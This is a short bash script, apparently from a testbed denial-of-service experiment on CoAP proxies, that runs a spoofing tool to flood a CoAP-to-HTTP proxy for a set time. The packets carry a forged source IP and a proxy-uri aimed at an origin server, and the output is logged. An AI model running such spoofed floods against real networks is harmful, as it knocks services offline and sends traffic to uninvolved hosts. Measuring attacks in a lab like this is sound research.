#!/bin/bash

source /proj/MIT-DoS/exp/coap-setup/deps/californium/deter/scripts/config.sh

rm -f $TMP_DATA/$ATTACKER_LOGNAME
touch $TMP_DATA/$ATTACKER_LOGNAME

PROXY_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy`
ATTACKER_SPOOFED_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy receiver`
ORIGIN_SERVER_IP=`bash $SCRIPTS_HOME/fetchips.sh proxy originserver`

# Delay the start of the attacker
sleep $ATTACKER_START_LAG_DURATION

# Then start the attacker in background
(python3 $SCRIPTS_HOME/coapspoofer.py \
  --debug \
  --source $ATTACKER_SPOOFED_IP \
  --src-port $ATTACKER_SPOOFED_PORT \
  --destination $PROXY_IP \
  --dst-port $PROXY_COAP_PORT \
  --message-type CON \
  --code 001 \
  --uri-host $PROXY_IP \
  --uri-path coap2http \
  --proxy-uri http://$ORIGIN_SERVER_IP:$ORIGIN_SERVER_PORT \
  --flood True > $TMP_DATA/$ATTACKER_LOGNAME) &

# Kill attacker after it's run in the background for the desired duration
spoofer_pid=$!
sleep $ATTACKER_DURATION
kill $spoofer_pid